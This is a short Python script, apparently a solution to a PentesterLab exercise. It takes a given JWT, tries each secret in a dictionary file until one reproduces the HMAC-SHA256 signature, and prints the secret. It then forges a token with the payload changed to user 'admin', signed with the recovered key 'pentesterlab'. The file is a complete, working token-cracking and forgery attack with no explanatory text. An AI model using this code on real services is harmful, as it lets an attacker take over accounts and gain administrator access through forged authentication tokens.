import hmac
import base64
import hashlib
jwt="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
h,p,s=jwt.split(".")
def sign(str,key):
    return base64.urlsafe_b64encode(hmac.new(bytes(key,encoding='utf8'),str.encode('utf8'),hashlib.sha256).digest()).decode('utf8').rstrip("=")

file=open("dictionary.txt",'r')
lines=file.readlines()
for line in lines:
    key=line.strip()
    if sign(h+"."+p,key) == s:
        print(key)


key="pentesterlab"
p="eyJ1c2VyIjoiYWRtaW4ifQ"
print(h+"."+p+"."+sign(h+"."+p,key))
